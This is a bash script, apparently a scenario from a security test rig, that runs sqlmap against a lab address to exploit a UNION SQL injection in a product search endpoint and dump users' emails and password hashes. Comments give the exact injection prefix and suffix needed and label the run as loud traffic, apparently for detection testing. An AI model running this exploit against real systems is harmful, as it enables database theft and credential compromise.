#!/usr/bin/env bash
# ATK-08 variant a: sqlmap finds the UNION injection in product search and dumps Users' emails and
# password hashes. sqlmap's own user agent (loud). Runs inside the rig's tools container only.
# Unaided, sqlmap finds nothing: the search query wraps q in two brackets, so it needs the prefix '))
# and a comment suffix (what a real attacker reads off the 500 error page).
# tool: sqlmap 1.10.11
# label: loud: sqlmap UNION dump of Users through search, sqlmap user agent
set -eu
sqlmap -u 'http://10.66.0.10/rest/products/search?q=apple' -p q \
  --dbms=sqlite --technique=U --prefix="'))" --suffix='--' --no-cast --batch --answers='crack=N' \
  -T Users -C email,password --dump \
  -t /out/traffic.txt --output-dir=/out/sqlmap
